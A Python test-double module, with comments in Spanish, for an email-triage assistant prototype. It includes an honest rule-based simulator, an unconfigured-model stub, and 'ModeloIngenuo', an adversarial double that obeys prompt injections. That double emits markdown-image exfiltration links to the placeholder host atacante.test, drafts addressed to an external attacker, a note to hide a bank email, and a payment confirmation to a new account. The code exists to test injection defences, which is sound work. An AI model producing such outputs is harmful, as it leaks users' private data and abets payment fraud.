"""Interfaz del modelo y dobles de prueba. NO hay LLM real en el prototipo.

ModeloReglas: simulador determinista honesto (no obedece instrucciones del contenido).
ModeloIngenuo: doble ADVERSARIO que obedece las inyecciones; sirve para demostrar que los
controles estructurales (esquema, filtro, destinatarios, briefing determinista) las neutralizan
aunque el modelo falle. Un LLM real puede fallar asi; el diseno no debe depender de que no lo haga.
ModeloNoConfigurado: lo que ocurre sin servicio contratado (condicion 7: error claro).
"""
import json
import re
import unicodedata


class ModeloNoDisponible(RuntimeError):
    pass


class Modelo:
    def completar(self, tarea: str, sistema: str, entrada: str) -> str:  # pragma: no cover
        raise NotImplementedError


class ModeloNoConfigurado(Modelo):
    def completar(self, tarea, sistema, entrada):
        raise ModeloNoDisponible(
            "No hay modelo configurado. Que paso: el prototipo no usa ningun servicio externo. "
            "Por que: contratar un LLM con region UE confirmada por escrito es decision de la persona "
            "(requisito 5 y condicion 12). Que hacer: usar ModeloReglas para la demo o contratar y verificar el servicio."
        )


def _datos(entrada: str) -> str:
    m = re.search(r"<<DATOS-(\w+)>>(.*?)<</DATOS-\1>>", entrada, re.S)
    return m.group(2) if m else ""


def _n(t: str) -> str:
    return "".join(c for c in unicodedata.normalize("NFD", t.lower()) if unicodedata.category(c) != "Mn")


def _asunto(datos: str) -> str:
    m = re.search(r"Asunto:\s*(.*)", datos)
    return (m.group(1).strip() if m else "")[:120]


class ModeloReglas(Modelo):
    def completar(self, tarea, sistema, entrada):
        datos = _datos(entrada)
        t = _n(datos)
        if tarea == "triaje":
            if re.search(r"cambio de cuenta|nuevo iban|nueva cuenta|iban", t):
                et, pr, resp = "Riesgo", "alta", False
            elif re.search(r"boletin|newsletter|darse de baja", t):
                et, pr, resp = "Informativo", "baja", False
            elif re.search(r"vencimiento|deposito|saldo|extracto", t):
                et, pr, resp = "Importante", "media", False
            elif re.search(r"confirma|disponibilidad|puedes|podrias|cena|\?", t):
                et, pr, resp = "Responder", "media", True
            else:
                et, pr, resp = "Informativo", "baja", False
            return json.dumps({
                "etiqueta": et, "prioridad": pr, "requiere_respuesta": resp,
                "resumen": f"Correo sobre: {_asunto(datos)}"[:240],
                "sospecha_inyeccion": False, "motivo_sospecha": "",
                "contiene_importes_o_cuentas": bool(re.search(r"iban|\d[\d.]*\s?(eur|€)", t)),
            })
        if tarea == "borrador":
            return json.dumps({"cuerpo": "Hola. Gracias por tu mensaje. Lo reviso y te confirmo en breve."})
        if tarea == "dossier":
            return json.dumps({"puntos": ["Repasar los temas pendientes de la ultima interaccion registrada."],
                               "preguntas": ["Que decision se espera obtener de esta reunion?"]})
        raise ValueError(tarea)


class ModeloIngenuo(Modelo):
    """Obedece al contenido. Solo para pruebas de abuso."""

    def completar(self, tarea, sistema, entrada):
        datos = _datos(entrada)
        if tarea == "triaje":
            urgente = re.search(r"urgente", datos, re.I) is not None
            resumen = f"Correo sobre: {_asunto(datos)}"
            if "![" in datos:
                resumen += " ![](https://atacante.test/p?d=RESUMEN_PRIVADO)"
            if re.search(r"no menciones", datos, re.I):
                resumen += " Nota: omitir el correo del banco. Mas info https://atacante.test/x"
            return json.dumps({
                "etiqueta": "Importante" if urgente else "Responder",
                "prioridad": "alta" if urgente else "media",
                "requiere_respuesta": True,
                "resumen": resumen[:240], "sospecha_inyeccion": False, "motivo_sospecha": "",
                "contiene_importes_o_cuentas": False,
            })
        if tarea == "borrador":
            return json.dumps({"cuerpo": "Para: externo@atacante.test\nCC: externo@atacante.test\n"
                               "Adjunto el resumen: ![](https://atacante.test/p?d=SECRETO) [pulsa](https://atacante.test/z)\n"
                               "Hola, confirmo el pago a la nueva cuenta ES00 0000 0000 0000 0000 0000."})
        if tarea == "dossier":
            return json.dumps({"puntos": ["Contenido de los ultimos correos: invento-sobre-otro-correo https://atacante.test/d"],
                               "preguntas": []})
        raise ValueError(tarea)


class ModeloRoto(Modelo):
    def completar(self, tarea, sistema, entrada):
        return "Claro, aqui tienes el analisis: el correo es urgente."
